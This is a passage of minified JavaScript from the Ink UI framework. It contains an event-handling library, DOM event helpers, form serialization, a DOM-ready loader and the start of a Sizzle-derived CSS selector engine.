e}if((o=c&&t.replace(a,""))&&b[o]&&(o=b[o].base),!t||c)(s=c&&t.replace(r,""))&&(s=m(s,".")),A(e,o,n,s);else if(v(t))A(e,null,t);else for(i in t)t.hasOwnProperty(i)&&P(e,i,t[i]);return e},N=function(e,t,i,o){var s,l,c,u,d,g,y;if(void 0!==i||"object"!=typeof t){for(v(i)?(d=f.call(arguments,3),o=s=i):(s=o,d=f.call(arguments,4),o=O(i,s,n)),c=m(t),this===p&&(o=T(P,e,t,o,s)),u=c.length;u--;)y=C.put(g=new I(e,c[u].replace(a,""),o,s,m(c[u].replace(r,""),"."),d,!1)),g[h]&&y&&E(e,g.eventType,!0,g.customType);return e}for(l in t)t.hasOwnProperty(l)&&N.call(this,e,l,t[l])},M=function(e,t,n,i){return N.apply(null,g(n)?[e,n,t,i].concat(arguments.length>3?f.call(arguments,5):[]):f.call(arguments))},L=function(){return N.apply(p,arguments)},U=function(e,t,n){for(var i,o,r=C.get(t,n,null,!1),a=r.length,s=0;s<a;s++)r[s].original&&(i=[e,r[s].type],(o=r[s].handler.__beanDel)&&i.push(o.selector),i.push(r[s].original),N.apply(null,i));return e},R={on:N,add:M,one:L,off:P,remove:P,clone:U,fire:function(e,t,n){var i,o,s,l,c,u=m(t);for(i=u.length;i--;)if(t=u[i].replace(a,""),(l=u[i].replace(r,""))&&(l=m(l,".")),l||n||!e[h])for(c=C.get(e,t,null,!1),n=[!1].concat(n),o=0,s=c.length;o<s;o++)c[o].inNamespaces(l)&&c[o].handler.apply(e,n);else D(_[t],t,e);return e},Event:w,setSelectorEngine:x,noConflict:function(){return t[e]=o,this}};if(i.attachEvent){var F=function(){var e,t=C.entries();for(e in t)t[e].type&&"unload"!==t[e].type&&P(t[e].element,t[e].type);i.detachEvent("onunload",F),i.CollectGarbage&&i.CollectGarbage()};i.attachEvent("onunload",F)}return x(Ink.ss),R}(),t={KEY_BACKSPACE:8,KEY_TAB:9,KEY_RETURN:13,KEY_ESC:27,KEY_SPACE:32,KEY_LEFT:37,KEY_UP:38,KEY_RIGHT:39,KEY_DOWN:40,KEY_DELETE:46,KEY_HOME:36,KEY_END:35,KEY_PAGEUP:33,KEY_PAGEDOWN:34,KEY_INSERT:45,throttle:function(e,t,n){t=t||0,n=n||{};var i,o=0;return function r(a){var s=+new Date,l=s-o;if(n.preventDefault&&a&&"function"==typeof a.preventDefault&&a.preventDefault(),l>=t)return o=s,e.apply("bind"in n?n.bind:this,[].slice.call(arguments));var c=this,u=[].slice.call(arguments);i&&clearTimeout(i),i=setTimeout((function(){return i=null,r.apply(c,u)}),t-l)}},element:function(e){var t=e.delegationTarget||e.target||"mouseout"===e.type&&e.fromElement||"mouseleave"===e.type&&e.fromElement||"mouseover"===e.type&&e.toElement||"mouseenter"===e.type&&e.toElement||e.srcElement||null;return!t||3!==t.nodeType&&4!==t.nodeType?t:t.parentNode},relatedTarget:function(e){var t=e.relatedTarget||"mouseout"===e.type&&e.toElement||"mouseleave"===e.type&&e.toElement||"mouseover"===e.type&&e.fromElement||"mouseenter"===e.type&&e.fromElement||null;return!t||3!==t.nodeType&&4!==t.nodeType?t:t.parentNode},findElement:function(e,t,n){for(var i=this.element(e);;){if(i.nodeName.toLowerCase()===t.toLowerCase())return i;if(!(i=i.parentNode))return!n&&document;if(!i.parentNode)return!n&&document}},observe:function(e,t,n,i){if(e=Ink.i(e))return e.addEventListener?e.addEventListener(t,n,!!i):e.attachEvent("on"+t,n=Ink.bind(n,e)),n},observeOnce:function(e,n,i,o){var r=t.observe(e,n,(function(){return t.stopObserving(e,n,r),i.apply(this,arguments)}),o);return r},observeMulti:function(e,t,n,i){if("string"==typeof e?e=Ink.ss(e):e&&1===e.nodeType&&(e=[e]),!e[0])return!1;for(var o=0,r=e.length;o<r;o++)this.observe(e[o],t,n,i);return n},observeDelegated:function(e,n,i,o){return t.observe(e,n,(function(n){var r=t.element(n);if(r&&r!==e)for(var a=r;a!==e&&a!==document&&a;){if(Ink.Dom.Selector_1.matchesSelector(a,i))return n.delegationTarget=a,o(n);a=a.parentNode}}))},stopObserving:function(e,t,n,i){(e=Ink.i(e))&&(e.removeEventListener?e.removeEventListener(t,n,!!i):e.detachEvent("on"+t,n))},stop:function(e){null!==e.cancelBubble&&(e.cancelBubble=!0),e.stopPropagation&&e.stopPropagation(),e.preventDefault&&e.preventDefault(),window.attachEvent&&(e.returnValue=!1),null!==e.cancel&&(e.cancel=!0)},stopPropagation:function(e){null!==e.cancelBubble&&(e.cancelBubble=!0),e.stopPropagation&&e.stopPropagation()},stopDefault:function(e){e.preventDefault&&e.preventDefault(),window.attachEvent&&(e.returnValue=!1),null!==e.cancel&&(e.cancel=!0)},pointer:function(e){return{x:this.pointerX(e),y:this.pointerY(e)}},pointerX:function(e){return e.touches&&e.touches[0]&&e.touches[0].pageX||e.pageX||e.clientX},pointerY:function(e){return e.touches&&e.touches[0]&&e.touches[0].pageY||e.pageY||e.clientY},isLeftClick:function(e){if(window.addEventListener){if(0===e.button)return!0;if("touchend"===e.type&&null===e.button)return!0}else if(1===e.button)return!0;return!1},isRightClick:function(e){return 2===e.button},isMiddleClick:function(e){return window.addEventListener?1===e.button:4===e.button},getCharFromKeyboardEvent:function(e,t){var n=e.keyCode,i=String.fromCharCode(n),o=e.shiftKey;if(n>=65&&n<=90)return"boolean"==typeof t&&(o=t),o?i:i.toLowerCase();if(n>=96&&n<=105)return String.fromCharCode(n-96+48);switch(n){case 109:case 189:return"-";case 107:case 187:return"+"}return i},debug:function(){}};return Ink.extendObj(t,e)})),Ink.createModule("Ink.Dom.FormSerialize",1,["Ink.Util.Array_1","Ink.Dom.Element_1","Ink.Dom.Selector_1"],(function(e,t,n){"use strict";function i(n){return null!=n&&!t.isDOMElement(n)&&(e.isArray(n)||"string"!=typeof n&&"number"==typeof n.length)}function o(e){return i(e)?e:[e]}var r={serialize:function(t,n){n=n||{};var i={},o={},a=this.asPairs(t,{elements:!0,emptyArray:o,outputUnchecked:n.outputUnchecked});return null==a?a:(e.forEach(a,(function(e){var t=/\[\]$/.test(e[0]),n=e[0].replace(/\[\]$/,""),a=e[1],s=e[2];a===o?i[n]=[]:r._resultsInArray(s)||t?n in i?(i[n]instanceof Array||(i[n]=[i[n]]),i[n].push(a)):i[n]=t?[a]:a:i[n]=a})),i)},asPairs:function(t,i){function o(e,t,n){i.elements?s.push([e,t,n]):s.push([e,t])}function a(t){var r=t.nodeName.toLowerCase(),a=(t.type+"").toLowerCase();if("select"===r&&t.multiple){var s=!1;e.forEach(n.select("option:checked",t),(function(e){o(t.name,e.value,t),s=!0})),!s&&"emptyArray"in i&&o(t.name,i.emptyArray,t)}else"input"!==r||"checkbox"!==a&&"radio"!==a||!i.outputUnchecked?o(t.name,t.value,t):o(t.name,null,t)}var s=[];if(i=i||{},t=Ink.i(t)){for(var l=e.filter(t.elements,(function(e){return r._isSerialized(e,i)})),c=0,u=l.length;c<u;c++)a(l[c]);return s}return null},fillIn:function(e,t){if(!(e=Ink.i(e)))return null;var n;if("object"!=typeof t||i(t)){if(!i(t))return null;n=t}else n=r._objToPairs(t);return r._fillInPairs(e,n)},_objToPairs:function(e){var t,n=[];for(var i in e)if(e.hasOwnProperty(i)){for(var r=0,a=(t=o(e[i])).length;r<a;r++)n.push([i,t[r]]);0===a&&n.push([i,[]])}return n},_fillInPairs:function(t,n){n=e.groupBy(n,{key:function(e){return e[0].replace(/\[\]$/,"")},adjacentGroups:!0});for(var i,a,s,l=0,c=(n=e.map(n,(function(t){var n=e.reduce(t,(function(e,t){return[null,e[1].concat([t[1]])]}),[null,[]])[1];return[t[0][0],n]}))).length;l<c;l++){if((i=n[l][0])in t)a=t[i];else{if(!(i+"[]"in t))continue;a=t[i+"[]"],i+="[]"}a=o(a),s=n[l][1],r._fillInOne(i,a,s)}},_fillInOne:function(e,n,i){var o=n[0],a=o.nodeName.toLowerCase(),s=o.getAttribute("type");s=s&&s.toLowerCase();var l="select"===a&&t.hasAttribute(o,"multiple");if("checkbox"===s||"radio"===s)r._fillInBoolean(n,i,"checked");else if(l)r._fillInBoolean(n[0].options,i,"selected");else{n.length!==i.length&&Ink.warn("Form had "+n.length+' inputs named "'+e+'", but received '+i.length+" values.");for(var c=0,u=Math.min(n.length,i.length);c<u;c+=1)n[c].value=i[c]}},_fillInBoolean:function(t,n,i){e.forEach(t,(function(t){var o=e.inArray(t.value,n);t[i]=o}))},_resultsInArray:function(e){var n=e.getAttribute("type"),i=e.nodeName.toLowerCase();return"checkbox"===n||"select"===i&&t.hasAttribute(e,"multiple")},_isSerialized:function(e,n){if(n=n||{},!t.isDOMElement(e))return!1;if(!t.hasAttribute(e,"name"))return!1;var i=e.nodeName.toLowerCase();return!(!i||"fieldset"===i||("checkbox"===e.type||"radio"===e.type)&&!n.outputUnchecked&&!e.checked)}};return r})),Ink.createModule("Ink.Dom.Loaded",1,[],(function(){"use strict";return{_contexts:[],run:function(e,t){t||(t=e,e=window);for(var n,i=0,o=this._contexts.length;i<o;i++)if(this._contexts[i][0]===e){n=this._contexts[i][1];break}n||((n={cbQueue:[],win:e,doc:e.document,root:e.document.documentElement,done:!1,top:!0}).handlers={checkState:Ink.bindEvent(this._checkState,this,n),poll:Ink.bind(this._poll,this,n)},this._contexts.push([e,n]));var r=n.doc.addEventListener;n.add=r?"addEventListener":"attachEvent",n.rem=r?"removeEventListener":"detachEvent",n.pre=r?"":"on",n.det=r?"DOMContentLoaded":"onreadystatechange",n.wet=n.pre+"load";var a=n.handlers.checkState;if(/complete|loaded/.test(n.doc.readyState)&&"about:blank"!==n.win.location.toString())setTimeout(Ink.bind((function(){t.call(n.win,"lazy")}),this),0);else{n.cbQueue.push(t),n.doc[n.add](n.det,a),n.win[n.add](n.wet,a);var s=1;try{s=n.win.frameElement}catch(e){}if(!r&&n.root&&n.root.doScroll){try{n.top=!s}catch(e){}n.top&&this._poll(n)}}},_checkState:function(e,t){e&&("readystatechange"!==e.type||/complete|loaded/.test(t.doc.readyState))&&(("load"===e.type?t.win:t.doc)[t.rem](t.pre+e.type,t.handlers.checkState,!1),this._ready(t))},_poll:function(e){try{e.root.doScroll("left")}catch(t){return setTimeout(e.handlers.poll,50)}this._ready(e)},_ready:function(e){if(!e.done){e.done=!0;for(var t=0;t<e.cbQueue.length;++t)e.cbQueue[t].call(e.win);e.cbQueue=[]}}}})),Ink.createModule("Ink.Dom.Selector",1,[],(function(){"use strict";function e(e){return he.test(e+"")}function t(){var e,t=[];return e=function(n,i){return t.push(n+=" ")>w.cacheLength&&delete e[t.shift()],e[n]=i}}function n(e){return e[U]=!0,e}function i(e){var t=A.createElement("div");try{return!!e(t)}catch(e){return!1}finally{t=null}}function o(e,t,n,i){var o,r,a,s,l,d,h,p,f,m;if((t?t.ownerDocument||t:R)!==A&&T(t),n=n||[],!e||"string"!=typeof e)return n;if(1!==(s=(t=t||A).nodeType)&&9!==s)return[];if(D&&!i){if(o=pe.exec(e))if(a=o[1]){if(9===s){if(!(r=t.getElementById(a))||!r.parentNode)return n;if(r.id===a)return n.push(r),n}else if(t.ownerDocument&&(r=t.ownerDocument.getElementById(a))&&L(t,r)&&r.id===a)return n.push(r),n}else{if(o[2])return K.apply(n,t.getElementsByTagName(e)),n;if((a=o[3])&&F.getElementsByClassName&&t.getElementsByClassName)return K.apply(n,t.getElementsByClassName(a)),n}if(F.qsa&&!P.test(e)){if(h=!0,p=U,f=t,m=9===s&&e,1===s&&"object"!==t.nodeName.toLowerCase()){for(d=c(e),(h=t.getAttribute("id"))?p=h.replace(ge,"\\$&"):t.setAttribute("id",p),p="[id='"+p+"'] ",l=d.length;l--;)d[l]=p+u(d[l]);f=de.test(e)&&t.parentNode||t,m=d.join(",")}if(m)try{return K.apply(n,f.querySelectorAll(m)),n}catch(e){}finally{h||t.removeAttribute("id")}}}return function(e,t,n,i){var o,r,a,s,l,d=c(e);if(!i&&1===d.length){if((r=d[0]=d[0].slice(0)).length>2&&"ID"===(a=r[0]).type&&9===t.nodeType&&D&&w.relative[r[1].type]){if(!(t=(w.find.ID(a.matches[0].replace(ye,_e),t)||[])[0]))return n;e=e.slice(r.shift().value.length)}for(o=ue.needsContext.test(e)?0:r.length;o--&&(a=r[o],!w.relative[s=a.type]);)if((l=w.find[s])&&(i=l(a.matches[0].replace(ye,_e),de.test(r[0].type)&&t.parentNode||t))){if(r.splice(o,1),!(e=i.length&&u(r)))return K.apply(n,i),n;break}}return C(e,d)(i,t,!D,n,de.test(e)),n}(e.replace(re,"$1"),t,n,i)}function r(e,t){var n=t&&e,i=n&&(~t.sourceIndex||Y)-(~e.sourceIndex||Y);if(i)return i;if(n)for(;n=n.nextSibling;)if(n===t)return-1;return e?1:-1}function a(e){return function(t){return"input"===t.nodeName.toLowerCase()&&t.type===e}}function s(e){return function(t){var n=t.nodeName.toLowerCase();return("input"===n||"button"===n)&&t.type===e}}function l(e){return n((function(t){return t=+t,n((function(n,i){for(var o,r=e([],n.length,t),a=r.length;a--;)n[o=r[a]]&&(n[o]=!(i[o]=n[o]))}))}))}function c(e,t){var n,i,r,a,s,l,c,u=z[e+" "];if(u)return t?0:u.slice(0);for(s=e,l=[],c=w.preFilter;s;){for(a in n&&!(i=ae.exec(s))||(i&&(s=s.slice(i[0].length)||s),l.push(r=[])),n=!1,(i=se.exec(s))&&(n=i.shift(),r.push({value:n,type:i[0].replace(re," ")}),s=s.slice(n.length)),w.filter)!(i=ue[a].exec(s))||c[a]&&!(i=c[a](i))||(n=i.shift(),r.push({value:n,type:a,matches:i}),s=s.slice(n.length));if(!n)break}return t?s.length:s?o.error(e):z(e,l).slice(0)}function u(e){for(var t=0,n=e.length,i="";t<n;t++)i+=e[t].value;return i}function d(e,t,n){var i=t.dir,o=n&&"parentNode"===i,r=H++;return t.first?function(t,n,r){for(;t=t[i];)if(1===t.nodeType||o)return e(t,n,r)}:function(t,n,a){var s,l,c,u=j+" "+r;if(a){for(;t=t[i];)if((1===t.nodeType||o)&&e(t,n,a))return!0}else for(;t=t[i];)if(1===t.nodeType||o)if((l=(c=t[U]||(t[U]={}))[i])&&l[0]===u){if(!0===(s=l[1])||s===b)return!0===s}else if((l=c[i]=[u])[1]=e(t,n,a)||b,!0===l[1])return!0}}function h(e){return e.length>1?function(t,n,i){for(var o=e.length;o--;)if(!e[o](t,n,i))return!1;return!0}:e[0]}function p(e,t,n,i,o){for(var r,a=[],s=0,l=e.length,c=null!=t;s<l;s++)(r=e[s])&&(n&&!n(r,i,o)||(a.push(r),c&&t.push(s)));return a}function f(e,t,i,o,r,a){return o&&!o[U]&&(o=f(o)),r&&!r[U]&&(r=f(r,a)),n((function(n,a,s,l){var c,u,d,h=[],f=[],m=a.length,g=n||v(t||"*",s.nodeType?[s]:s,[]),y=!e||!n&&t?g:p(g,h,e,s,l),_=i?r||(n?e:m||o)?[]:a:y;if(i&&i(y,_,s,l),o)for(c=p(_,f),o(c,[],s,l),u=c.length;u--;)(d=c[u])&&(_[f[u]]=!(y[f[u]]=d));if(n){if(r||e){if(r){for(c=[],u=_.length;u--;)(d=_[u])&&c.push(y[u]=d);r(null,_=[],c,l)}for(u=_.length;u--;)(d=_[u])&&(c=r?Q.call(n,d):h[u])>-1&&(n[c]=!(a[c]=d))}}else _=p(_===a?_.splice(m,_.length):_),r?r(null,a,_,l):K.apply(a,_)}))}function m(e){for(var t,n,i,o=e.length,r=w.relative[e[0].type],a=r||w.relative[" "],s=r?1:0,l=d((function(e){return e===t}),a,!0),c=d((function(e){return Q.call(t,e)>-1}),a,!0),p=[function(e,n,i){return!r&&(i||n!==x)||((t=n).nodeType?l(e,n,i):c(e,n,i))}];s<o;s++)if(n=w.relative[e[s].type])p=[d(h(p),n)];else{if((n=w.filter[e[s].type].apply(null,e[s].matches))[U]){for(i=++s;i<o&&!w.relative[e[i].type];i++);return f(s>1&&h(p),s>1&&u(e.slice(0,s-1)).replace(re,"$1"),n,s<i&&m(e.slice(s,i)),i<o&&m(e=e.slice(i)),i<o&&u(e))}p.push(n)}return h(p)}function g(e,t){var i=0,r=t.length>0,a=e.length>0,s=function(n,s,l,c,u){var d,h,f,m=[],g=0,v="0",y=n&&[],_=null!=u,k=x,I=n||a&&w.find.TAG("*",u&&s.parentNode||s),C=j+=null==k?1:Math.random()||.1;for(_&&(x=s!==A&&s,b=i);null!=(d=I[v]);v++){if(a&&d){for(h=0;f=e[h++];)if(f(d,s,l)){c.push(d);break}_&&(j=C,b=++i)}r&&((d=!f&&d)&&g--,n&&y.push(d))}if(g+=v,r&&v!==g){for(h=0;f=t[h++];)f(y,m,s,l);if(n){if(g>0)for(;v--;)y[v]||m[v]||(m[v]=Z.call(c));m=p(m)}K.apply(c,m),_&&!n&&m.length>0&&g+t.length>1&&o.uniqueSort(c)}return _&&(j=C,x=k),y};return r?n(s):s}function v(e,t,n){for(var i=0,r=t.length;i<r;i++)o(e,t[i],n);return n}function y(){}var _,b,w,k,I,C,x,S,E,T,A,O,D,P,N,M,L,U="sizzle"+-new Date,R=window.document,F={},j=0,H=0,B=t(),z=t(),W=t(),V=!1,q=function(){return 0},$="undefined",Y=1<<31,G=[],Z=G.pop,J=G.push,K=G.push,X=G.slice,Q=G.indexOf||function(e){for(var t=0,n=this.length;t<n;t++)if(this[t]===e)return t;return-1},ee="[\\x20\\t\\r\\n\\f]",te="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",ne=te.replace("w","w#"),ie="\\["+ee+"*("+te+")"+ee+"*(?:([*^$|!~]?=)"+ee+"*(?:(['\"])((?:\\\\.|[^\\\\])*?)\\3|("+ne+")|)|)"+ee+"*\\]",oe=":("+te+")(?:\\(((['\"])((?:\\\\.|[^\\\\])*?)\\3|((?:\\\\.|[^\\\\()[\\]]|"+ie.replace(3,8)+")*)|.*)\\)|)",re=new RegExp("^"+ee+"+|((?:^|[^\\\\])(?:\\\\.)*)"+ee+"+$","g"),ae=new RegExp("^"+ee+"*,"+ee+"*"),se=new RegExp("^"+ee+"*([\\x20\\t\\r\\n\\f>+~])"+ee+"*"),le=new RegExp(oe),ce=new RegExp("^"+ne+"$"),ue={ID:new RegExp("^#("+te+")"),CLASS:new RegExp("^\\.("+te+")"),NAME:new RegExp("^\\[name=['\"]?("+te+")['\"]?\\]"),TAG:new RegExp("^("+te.replace("w","w*")+")"),ATTR:new RegExp("^"+ie),PSEUDO:new RegExp("^"+oe),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+ee+"*(even|odd|(([+-]|)(\\d*)n|)"+ee+"*(?:([+-]|)"+ee+"*(\\d+)|))"+ee+"*\\)|)","i"),needsContext:new RegExp("^"+ee+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+ee+"*((?:-\\d)?\\d*)"+ee+"*\\)|)(?=[^-]|$)","i")},de=/[\x20\t\r\n\f]*[+~]/,he=/^[^{]+\{\s*\[native code/,pe=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,fe=/^(?:input|select|textarea|button)$/i,me=/^h\d$/i,ge=/'|\\/g,ve=/\=[\x20\t\r\n\f]*([^'"\]]*)[\x20\t\r\n\f]*\]/g,ye=/\\([\da-fA-F]{1,6}[\x20\t\r\n\f]?|.)/g,_e=function(e,t){var n="0x"+t-65536;return n!=n?t:n<0?String.fromCharCode(n+65536):String.fromCharCode(n>>10|55296,1023&n|56320)};try{K.apply(G=X.call(R.childNodes),R.childNodes),G[R.childNodes.length].nodeType}catch(e){K={apply:G.length?function(e,t){J.apply(e,X.call(t))}:function(e,t){for(var n=e.length,i=0;e[n++]=t[i++];);e.length=n-1}}}for(_ in I=o.isXML=function(e){var t=e&&(e.ownerDocument||e).documentElement;return!!t&&"HTML"!==t.nodeName},T=o.setDocument=function(t){var n=t?t.ownerDocument||t:R;return n!==A&&9===n.nodeType&&n.documentElement?(A=n,O=n.documentElement,D=!I(n),F.getElementsByTagName=i((function(e){return e.appendChild(n.createComment("")),!e.getElementsByTagName("*").length})),F.attributes=i((function(e){e.innerHTML="<select></select>";var t=typeof e.lastChild.getAttribute("multiple");return"boolean"!==t&&"string"!==t})),F.getElementsByClassName=i((function(e){return e.innerHTML="<div class='hidden e'></div><div class='hidden'></div>",!(!e.getElementsByClassName||!e.getElementsByClassName("e").length)&&(e.lastChild.className="e",2===e.getElementsByClassName("e").length)})),F.getByName=i((function(e){e.id=U+0,e.appendChild(A.createElement("a")).setAttribute("name",U),e.appendChild(A.createElement("i")).setAttribute("name",U),O.appendChild(e);var t=n.getElementsByName&&n.getElementsByName(U).length===2+n.getElementsByName(U+0).length;return O.removeChild(e),t})),F.sortDetached=i((function(e){return e.compareDocumentPosition&&1&e.compareDocumentPosition(A.createElement("div"))})),w.attrHandle=i((function(e){return e.innerHTML="<a href='#'></a>",e.firstChild&&typeof e.firstChild.getAttribute!==$&&"#"===e.firstChild.getAttribute("href")}))?{}:{href:function(e){return e.getAttribute("href",2)},type:function(e){return e.getAttribute("type")}},F.getByName?(w.find.ID=function(e,t){if(typeof t.getElementById!==$&&D){var n=t.getElementById(e);return n&&n.parentNode?[n]:[]}},w.filter.ID=function(e){var t=e.replace(ye,_e);return function(e){return e.getAttribute("id")===t}}):(w.find.ID=function(e,t){if(typeof t.getElementById!==$&&D){var n=t.getElementById(e);return n?n.id===e||typeof n.getAttributeNode!==$&&n.getAttributeNode("id").value===e?[n]:void 0:[]}},w.filter.ID=function(e){var t=e.replace(ye,_e);return function(e){var n=typeof e.getAttributeNode!==$&&e.getAttributeNode("id");return n&&n.value===t}}),w.find.TAG=F.getElementsByTagName?function(e,t){if(typeof t.getElementsByTagName!==$)return t.getElementsByTagName(e)}:function(e,t){var n,i=[],o=0,r=t.getElementsByTagName(e);if("*"===e){for(;n=r[o++];)1===n.nodeType&&i.push(n);return i}return r},w.find.NAME=F.getByName&&function(e,t){if(typeof t.getElementsByName!==$)return t.getElementsByName(name)},w.find.CLASS=F.getElementsByClassName&&function(e,t){if(typeof t.getElementsByClassName!==$&&D)return t.getElementsByClassName(e)},N=[],P=[":focus"],(F.qsa=e(n.querySelectorAll))&&(i((function(e){e.innerHTML="<select><option selected=''></option></select>",e.querySelectorAll("[selected]").length||P.push("\\["+ee+"*(?:checked|disabled|ismap|multiple|readonly|selected|value)"),e.querySelectorAll(":checked").length||P.push(":checked")})),i((function(e){e.innerHTML="<input type='hidden' i=''/>",e.querySelectorAll("[i^='']").length&&P.push("[*^$]="+ee+"*(?:\"\"|'')"),e.querySelectorAll(":enabled").length||P.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),P.push(",.*:")}))),(F.matchesSelector=e(M=O.matchesSelector||O.mozMatchesSelector||O.webkitMatchesSelector||O.oMatchesSelector||O.msMatchesSelector))&&i((function(e){F.disconnectedMatch=M.call(e,"div"),M.call(e,"[s!='']:x"),N.push("!=",oe)})),P=new RegExp(P.join("|")),N=N.length&&new RegExp(N.join("|")),L=e(O.contains)||O.compareDocumentPosition?function(e,t){var n=9===e.nodeType?e.documentElement:e,i=t&&t.parentNode;return e===i||!(!i||1!==i.nodeType||!(n.contains?n.contains(i):e.compareDocumentPosition&&16&e.compareDocumentPosition(i)))}:function(e,t){if(t)for(;t=t.parentNode;)if(t===e)return!0;return!1},q=O.compareDocumentPosition?function(e,t){if(e===t)return V=!0,0;var i=t.compareDocumentPosition&&e.compareDocumentPosition&&e.compareDocumentPosition(t);return i?1&i||S&&t.compareDocumentPosition(e)===i?e===n||L(R,e)?-1:t===n||L(R,t)?1:E?Q.call(E,e)-Q.call(E,t):0:4&i?-1:1:e.compareDocumentPosition?-1:1}:function(e,t){var i,o=0,a=e.parentNode,s=t.parentNode,l=[e],c=[t];if(e===t)return V=!0,0;if(!a||!s)return e===n?-1:t===n?1:a?-1:s?1:0;if(a===s)return r(e,t);for(i=e;i=i.parentNode;)l.unshift(i);for(i=t;i=i.parentNode;)c.unshift(i);for(;l[o]===c[o];)o++;return o?r(l[o],c[o]):l[o]===R?-1:c[o]===R?1:0},A):A},o.matches=function(e,t){return o(e,null,null,t)},o.matchesSelector=function(e,t){if((e.ownerDocument||e)!==A&&T(e),t=t.replace(ve,"='$1']"),F.matchesSelector&&D&&(!N||!N.test(t))&&!P.test(t))try{var n=M.call(e,t);if(n||F.disconnectedMatch||e.document&&11!==e.document.nodeType)return n}catch(e){}return o(t,A,null,[e]).length>0},o.contains=function(e,t){return(e.ownerDocument||e)!==A&&T(e),L(e,t)},o.attr=function(e,t){var n;return(e.ownerDocument||e)!==A&&T(e),D&&(t=t.toLowerCase()),(n=w.attrHandle[t])?n(e):!D||F.attributes?e.getAttribute(t):((n=e.getAttributeNode(t))||e.getAttribute(t))&&!0===e[t]?t:n&&n.specified?n.value:null},o.error=function(e){throw new Error("Syntax error, unrecognized expression: "+e)},o.uniqueSort=function(e){var t,n=[],i=0,o=0;if(V=!F.detectDuplicates,S=!F.sortDetached,E=!F.sortStable&&e.slice(0),e.sort(q),V){for(;t=e[o++];)t===e[o]&&(i=n.push(o));for(;i--;)e.splice(n[i],1)}return e},k=o.getText=function(e){var t,n="",i=0,o=e.nodeType;if(o){if(1===o||9===o||11===o){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=k(e)}else if(3===o||4===o)return e.nodeValue}else for(;t=e[i];i++)n+=k(t);return n},w=o.selectors={cacheLength:50,createPseudo:n,match:ue,find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace(ye,_e),e[3]=(e[4]||e[5]||"").replace(ye,_e),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||o.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&o.error(e[0]),e},PSEUDO:function(e){var t,n=!e[5]&&e[2];return ue.CHILD.test(e[0])?null:(e[4]?e[2]=e[4]:n&&le.test(n)&&(t=c(n,!0))&&(t=n.indexOf(")",n.length-t)-n.length)&&(e[0]=e[0].slice(0,t),e[2]=n.slice(0,t)),e.slice(0,3))}},filter:{TAG:function(e){return"*"===e?function(){return!0}:(e=e.replace(ye,_e).toLowerCase(),function(t){return t.nodeName&&t.nodeName.toLowerCase()===e})},CLASS:function(e){var t=B[e+" "];return t||(t=new RegExp("(^|"+ee+")"+e+"("+ee+"|$)"))&&B(e,(function(e){return t.test(e.className||typeof e.getAttribute!==$&&e.getAttribute("class")||"")}))},ATTR:function(e,t,n){return function(i){var r=o.attr(i,e);return null==r?"!="===t:!t||(r+="","="===t?r===n:"!="===t?r!==n:"^="===t?n&&0===r.indexOf(n):"*="===t?n&&r.indexOf(n)>-1:"$="===t?n&&r.slice(-n.length)===n:"~="===t?(" "+r+" ").indexOf(n)>-1:"|="===t&&(r===n||r.slice(0,n.length+1)===n+"-"))}},CHILD:function(e,t,n,i,o){var r="nth"!==e.slice(0,3),a="last"!==e.slice(-4),s="of-type"===t;return 1===i&&0===o?function(e){return!!e.parentNode}:function(t,n,l){var c,u,d,h,p,f,m=r!==a?"nextSibling":"previousSibling",g=t.parentNode,v=s&&t.nodeName.toLowerCase(),y=!l&&!s;if(g){if(r){for(;m;){for(d=t;d=d[m];)if(s?d.nodeName.toLowerCase()===v:1===d.nodeType)return!1;f=m="only"===e&&!f&&"nextSibling"}return!0}if(f=[a?g.firstChild:g.lastChild],a&&y){for(p=(c=(u=g[U]||(g[U]={}))[e]||[])[0]===j&&c[1],h=c[0]===j&&c[2],d=p&&g.childNodes[p];d=++p&&d&&d[m]||(h=p=0)||f.pop();)if(1===d.nodeType&&++h&&d===t){u[e]=[j,p,h];break}}else if(y&&(c=(t[U]||(t[U]={}))[e])&&c[0]===j)h=c[1];else for(;(d=++p&&d&&d[m]||(h=p=0)||f.pop())&&((s?d.nodeName.toLowerCase()!==v:1!==d.nodeType)||!++h||(y&&((d[U]||(d[U]={}))[e]=[j,h]),d!==t)););return(h-=o)===i||h%i==0&&h/i>=0}}},PSEUDO:function(e,t){var i,r=w.pseudos[e]||w.setFilters[e.toLowerCase()]||o.error("unsupported pseudo: "+e);return r[U]?r(t):r.length>1?(i=[e,e,"",t],w.setFilters.hasOwnProperty(e.toLowerCase())?n((function(e,n){for(var i,o=r(e,t),a=o.length;a--;)e[i=Q.call(e,o[a])]=!(n[i]=o[a])})):function(e){return r(e,0,i)}):r}},pseudos:{not:n((function(e){var t=[],i=[],o=C(e.replace(re,"$1"));return o[U]?n((function(e,t,n,i){for(var r,a=o(e,null,i,[]),s=e.length;s--;)(r=a[s])&&(e[s]=!(t[s]=r))})):function(e,n,r){return t[0]=e,o(t,null,r,i),!i.pop()}})),has:n((function(e){return function(t){return o(e,t).length>0}})),contains:n((function(e){return function(t){return(t.textContent||t.innerText||k(t)).indexOf(e)>-1}})),lang:n((function(e){return ce.test(e||"")||o.error("unsupported lang: "+e),e=e.replace(ye,_e).toLowerCase(),function(t){var n;do{if(n=D?t.lang:t.getAttribute("xml:lang")||t.getAttribute("lang"))return(n=n.toLowerCase())===e||0===n.indexOf(e+"-")}while((t=t.parentNode)&&1===t.nodeType);return!1}})),target:function(e){var t=window.location&&window.location.hash;return t&&t.slice(1)===e.id},root:function(e){return e===O},focus:function(e){return e===A.activeElement&&(!A.hasFocus||A.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:function(e){return!1===e.disabled},disabled:function(e){return!0===e.disabled},checked:function(e){var 